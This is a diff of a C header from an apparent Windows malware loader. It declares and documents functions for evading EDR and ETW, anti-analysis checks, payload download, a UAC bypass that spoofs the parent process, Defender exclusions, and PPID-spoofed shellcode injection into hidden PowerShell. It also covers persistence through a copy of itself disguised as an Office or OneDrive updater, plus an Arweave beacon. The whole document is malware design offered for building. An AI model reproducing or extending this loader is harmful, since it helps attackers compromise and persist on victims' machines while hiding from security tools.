@@ -142,7 +142,11 @@ BOOL BlindDllNotifications(IN PAPI_HASHING pApi);
 BOOL PatchlessEtw(IN PAPI_HASHING pApi);
 VOID CleanupEvasion(IN PAPI_HASHING pApi);
 BOOL AntiAnalysis(VOID);
-BOOL InstallExitHook(IN PVOID pNtdll);
+#ifdef BUILD_DLL
+// Patchless exit hook: VEH + DR1 hardware execute-BP on RtlExitUserProcess.
+// No bytes written to ntdll. Safe from DllMain.
+BOOL InstallExitHookPatchless(IN PVOID pNtdll);
+#endif
 
 // Anti-emulation prologue. Runs API hammering + RDRAND consistency check
 // + CPUID hypervisor brand check. Returns TRUE if execution should continue.
@@ -182,51 +186,28 @@ BOOL BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sK
 // ----------- Staging -----------
 BOOL DownloadPayload(IN PAPI_HASHING pApi, IN LPCSTR szUrl, OUT PBYTE* ppData, OUT PDWORD pdwSize);
 
-// ----------- UAC Bypass / Install (UAC builds only) -----------
-// Two-process AppInfo RPC bypass (no manifest, no UAC dialog).
-// UacBypass: 3-path logic —
-//   (a) running as msoia.exe (from run-key) → return TRUE immediately
-//   (b) already elevated (spawned by bypass) → return TRUE
-//   (c) medium IL first run → AppInfo bypass → spawn elevated self → terminate → return FALSE
-// IsFirstRunProcess: TRUE when EXE filename != "msoia.exe" (i.e. original loader name).
-// InstallAndTerminate: copies self to %APPDATA%\Microsoft\Office\Updates\msoia.exe,
-//   sets HIDDEN|SYSTEM, runs WD exclusion via AppInfo parent-spoof, writes HKCU run-key,
-//   suppresses StartupApproved toast, then NtTerminateProcess self.
-// UacRunCommandElevated: acquires elevated ComputerDefaults handle via AppInfo RPC,
-//   then spawns wCommand as child of ComputerDefaults (parent-spoof).
-// InstallAndTerminate: available for all EXE builds.
-// All builds: copies self to %APPDATA%\Microsoft\Office\Updates\msoia.exe.
-//   Self-guard: if basename == msoia.exe (already persistence copy) → return (skip).
-// UAC builds: also runs WD exclusions + scheduled task (elevated PS) before copy,
-//   then launches via RunTaskViaCom, then NtTerminateProcess self.
-// Non-UAC builds: launches msoia.exe directly via CreateProcessW, then NtTerminateProcess self.
-VOID  InstallAndTerminate(IN PAPI_HASHING pApi);
+// ----------- Injection -----------
+// Spawns powershell.exe hidden with PPID=explorer.exe (PPID spoof),
+// injects shellcode via cross-process NtCreateSection + NtMapViewOfSection
+// (VAD shows Mapped, not MEM_PRIVATE), starts via NtCreateThreadEx,
+// then self-terminates the loader process.
+BOOL InjectIntoProcess(IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize);
 
-#ifdef UAC_BYPASS
-BOOL  UacBypass(IN PAPI_HASHING pApi);
-BOOL  IsFirstRunProcess(IN PAPI_HASHING pApi);
-BOOL  UacRunCommandElevated(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN LPWSTR wSysDir, IN LPWSTR wWinDir, IN LPWSTR wCommand);
-#endif
+// ----------- Install -----------
+// Copies self to %APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe.
+// Self-guard: if basename == OneDriveUpdateSync.exe (already persistence copy) → return (skip).
+// Copies self + writes HKCU run key on first run; returns so caller continues to payload.
+VOID  InstallAndContinue(IN PAPI_HASHING pApi);
 
 #ifdef BUILD_DLL
-// All sideload builds: copies host EXE + *.dll to persist dir, self-guard on reboot path.
-// [UAC only] Also runs WD exclusions + scheduled task via elevated PS.
+// Copies host EXE + *.dll to persist dir, writes HKCU run-key, self-guard on reboot path.
 VOID  SideloadInstallAndContinue(IN PAPI_HASHING pApi);
 
-// Persistence-reboot injection (opt-in via ENABLE_INJECT): writes already-placed shellcode
-// into a low-CPU target process and calls NtTerminateProcess(-1). Returns FALSE if no
-// target found — main.c falls back to thread-pool execution in the current process.
-#if defined(ENABLE_INJECT)
-BOOL  InjectAndHijack(IN PVOID pShellcode, IN DWORD dwSize);
-#endif
 #endif
 
-// ----------- Persistence (non-UAC builds only) -----------
+// ----------- Persistence -----------
 // Writes a REG_SZ run-key value pointing at the current EXE under HKCU\...\Run.
-// UAC builds use InstallAndTerminate (above) instead.
-#ifndef UAC_BYPASS
 BOOL InstallPersistence(IN PAPI_HASHING pApi);
-#endif
 
 // ----------- Arweave Beacon -----------
 // Decodes the Arweave wallet address from Payload.h (XOR-obfuscated), POSTs
